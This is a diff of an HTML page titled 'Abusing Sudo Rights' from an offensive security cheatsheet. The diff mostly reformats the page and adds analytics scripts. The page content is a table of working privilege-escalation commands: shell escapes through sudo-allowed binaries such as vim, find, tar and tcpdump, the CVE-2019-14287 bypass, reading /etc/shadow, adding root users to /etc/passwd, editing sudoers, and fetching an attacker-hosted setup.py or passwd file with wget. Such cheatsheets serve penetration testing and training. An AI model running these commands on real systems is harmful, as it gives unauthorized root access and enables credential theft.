@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2022-09-11T16:52:52 CEST">
+<meta name="revised" content="2023-02-14T12:07:00 CET">
 <title>Abusing Sudo Rights :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -27,7 +27,36 @@
     
       <header>
   <div class="logo">
-    <a class="baselink" href="/">Offensive Security Cheatsheet</a>
+    <head>
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-Q5C993721K', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+</head>
+<a class="baselink" href="/">Offensive Security Cheatsheet</a>
+
   </div>
   <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
     <nav class="shortcuts">
@@ -1819,14 +1848,11 @@
     
     
     
-    
-
-<h3 id="resources">Resources</h3>
+    <h3 id="resources">Resources</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
 
-https://gtfobins.github.io/</code></pre></div>
-<p><br/></p>
-
+https://gtfobins.github.io/
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="cve-2019-14287">CVE 2019-14287</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Exploitable when a user have the following permissions (sudo -l)</span>
 <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> ALL
@@ -1837,11 +1863,9 @@ sudo -u#-1 /bin/bash
 <span style="color:#75715e"># If no TTY, you can restart SSH server and add your key</span>
 sudo /etc/init.d/ssh restart
 <span style="color:#111">echo</span> <span style="color:#d88200">&#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms&#39;</span> &gt; authorized_keys
-sudo -u#-1 bash</code></pre></div>
-<p><br/></p>
-
+sudo -u#-1 bash
+</code></pre></div><!-- raw HTML omitted -->
 <h3 id="exploiting-sudo">Exploiting sudo</h3>
-
 <table>
 <thead>
 <tr>
@@ -1850,182 +1874,152 @@ sudo -u#-1 bash</code></pre></div>
 <th>Infos</th>
 </tr>
 </thead>
-
 <tbody>
 <tr>
 <td>apache2</td>
 <td>sudo apache2 -f /etc/shadow</td>
 <td># You will get an error and it will # display first line</td>
 </tr>
-
 <tr>
 <td>apt-get</td>
 <td>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</td>
 <td></td>
 </tr>
-
 <tr>
 <td>awk</td>
-<td>sudo awk &lsquo;BEGIN {system(&ldquo;/bin/sh&rdquo;)}&rsquo;</td>
+<td>sudo awk &lsquo;BEGIN {system(&quot;/bin/sh&quot;)}&rsquo;</td>
 <td></td>
 </tr>
-
 <tr>
 <td>ed</td>
 <td>sudo /usr/bin/ed !/bin/sh</td>
 <td></td>
 </tr>
-
 <tr>
 <td>find</td>
-<td>sudo find /etc/passwd -exec /bin/sh \; sudo find /bin -name nano -exec /bin/sh \;</td>
+<td>sudo find /etc/passwd -exec /bin/sh ; sudo find /bin -name nano -exec /bin/sh ;</td>
 <td></td>
 </tr>
-
 <tr>
 <td>ftp</td>
 <td>sudo ftp ftp&gt; /!/bin/bash</td>
 <td></td>
 </tr>
-
 <tr>
 <td>gdb</td>
 <td>sudo -u user gdb -q (gdb) shell</td>
 <td></td>
 </tr>
-
 <tr>
 <td>git</td>
 <td># Method 1 sudo -u user git -c core.pager=/tmp/script.sh &ndash;paginate help  # Method 2 sudo git help add !/bin/bash</td>
 <td># Method 1 Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2  # Method 2 You can also use the help add feature</td>
 </tr>
-
 <tr>
 <td>ht</td>
-<td>export TERM=xterm-color sudo ht /etc/sudoers  # F3 to open the file, then update lines <user> ALL=(ALL) NOPASSWD: ALL</td>
+<td>export TERM=xterm-color sudo ht /etc/sudoers  # F3 to open the file, then update lines <!-- raw HTML omitted --> ALL=(ALL) NOPASSWD: ALL</td>
 <td></td>
 </tr>
-
 <tr>
 <td>less</td>
 <td>sudo less /etc/hosts !sh</td>
 <td></td>
 </tr>
-
 <tr>
 <td>man</td>
 <td>sudo man man !sh</td>
 <td></td>
 </tr>
-
 <tr>
 <td>more</td>
 <td>sudo more /etc/hosts !sh</td>
 <td></td>
 </tr>
-
 <tr>
 <td>mount</td>
 <td>sudo mount -o bind /bin/bash /bin/mount sudo mount</td>
 <td></td>
 </tr>
-
 <tr>
 <td>mysql</td>
 <td>sudo mysql -e &lsquo;!/bin/sh&rsquo;</td>
 <td></td>
 </tr>
-
 <tr>
 <td>nano</td>
 <td>sudo nano  /etc/passwd</td>
-<td># You can then add a new root user openssl passwd -1 -salt user3 pass123  # /etc/passwd user3:<hash>:0:0:root:/root:/bin/bash</td>
+<td># You can then add a new root user openssl passwd -1 -salt user3 pass123  # /etc/passwd user3:<!-- raw HTML omitted -->:0:0:root:/root:/bin/bash</td>
 </tr>
-
 <tr>
 <td>nmap</td>
-<td># Method 1 sudo nmap &ndash;interactive nmap&gt; !sh   # Method 2 echo &ldquo;os.execute(&lsquo;/bin/sh&rsquo;)&rdquo; &gt; /tmp/shell.nse &amp;&amp; sudo nmap &ndash;script=/tmp/shell.nse</td>
+<td># Method 1 sudo nmap &ndash;interactive nmap&gt; !sh   # Method 2 echo &ldquo;os.execute('/bin/sh')&rdquo; &gt; /tmp/shell.nse &amp;&amp; sudo nmap &ndash;script=/tmp/shell.nse</td>
 <td># Method 1 # Using &ndash;interactive option  # Method 2 # Using &ndash;script option</td>
 </tr>
-
 <tr>
 <td>pico</td>
 <td>sudo -u user pico</td>
 <td># Type bash in editor an press ^T to   # trigger spellchecker</td>
 </tr>
-
 <tr>
 <td>pip</td>
-<td>python -m SimpleHTTPServer 80 wget <a href="http://192.168.1.134/setup.py">http://192.168.1.134/setup.py</a> sudo pip install . &ndash;upgrade &ndash;force-reinstall</td>
+<td>python -m SimpleHTTPServer 80 wget http://192.168.1.134/setup.py sudo pip install . &ndash;upgrade &ndash;force-reinstall</td>
 <td># You can use FakePip <a href="https://github.com/0x00-0x00/FakePip.git">https://github.com/0x00-0x00/FakePip.git</a> # Decode and change IP adress</td>
 </tr>
-
 <tr>
 <td>rbash</td>
 <td>echo $SHELL echo $PATH export SHELL=/bin/bash:$SHELL export PATH=/usr/bin:$PATH vi :!/bin/bash</td>
 <td></td>
 </tr>
-
 <tr>
 <td>rvim</td>
 <td>rvim version</td>
 <td>grep python echo “import os;os.system(&lsquo;bash&rsquo;)” &gt; /tmp/script.py sudo -u rvim -c &ldquo;pyfile /tmp/script.py&rdquo;</td>
 </tr>
-
 <tr>
 <td>scp</td>
 <td>sudo -u user scp -vv -C -S tmp/script.sh a whatever</td>
 <td># Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2</td>
 </tr>
-
 <tr>
 <td>script</td>
 <td>sudo -u user script /tmp/what-ever</td>
 <td></td>
 </tr>
-
 <tr>
 <td>ssh</td>
 <td>sudo -u user ssh -o ProxyCommand=/tmp/script.sh lel</td>
 <td># Create script.sh and chmod 777 → /bin/bash &gt;&amp;2 0&gt;&amp;2</td>
 </tr>
-
 <tr>
 <td>strace / sysud64</td>
 <td>sudo strace -o/dev/null /bin/bash sudo sysud64 -o/dev/null /bin/bash</td>
 <td></td>
 </tr>
-
 <tr>
 <td>tar</td>
 <td># Method 1 sudo -u user tar &ndash;checkpoint=1 &ndash;checkpoint-action=exec=/bin/bash -cf /tmp/12345.tar /dev/zero  # Method 2 cd /tmpcp /bin/bash . sudo chown root:root /tmp/bash sudo mv /bin/tar /bin/tar.bak sudo mv /tmp/bash /bin/tar sudo /bin/tar</td>
 <td></td>
 </tr>
-
 <tr>
 <td>tcpdump</td>
 <td>echo $’id\ncat /etc/shadow’ &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</td>
 <td></td>
 </tr>
-
 <tr>
 <td>teehee</td>
 <td>echo &ldquo;raaj::0:0:::/bin/bash&rdquo;</td>
 <td>sudo teehee -a /etc/passwd</td>
 </tr>
-
 <tr>
 <td>vim</td>
 <td>sudo vim -c &lsquo;!sh&rsquo;</td>
 <td></td>
 </tr>
-
 <tr>
 <td>wget</td>
-<td>sudo wget <a href="http://ip/filePasswd">http://ip/filePasswd</a> -O /etc/passwd su user1</td>
+<td>sudo wget http://ip/filePasswd -O /etc/passwd su user1</td>
 <td># Attacker side # Copy target&rsquo;s file /etc/passwd  # Add a new user and host the fil</td>
 </tr>
-
 <tr>
 <td>zip</td>
 <td># Method 1 touch /tmp/xyz; chmod 444 /tmp/xyz sudo -u user zip /tmp/zzz.zip /tmp/xyz -T -TT /tmp/script.sh  # Method 2 touch raj sudo zip /tmp/nisha.zip /home/zico/raj -T &ndash;unzip-command=&ldquo;sh -c /bin/bash&rdquo;</td>
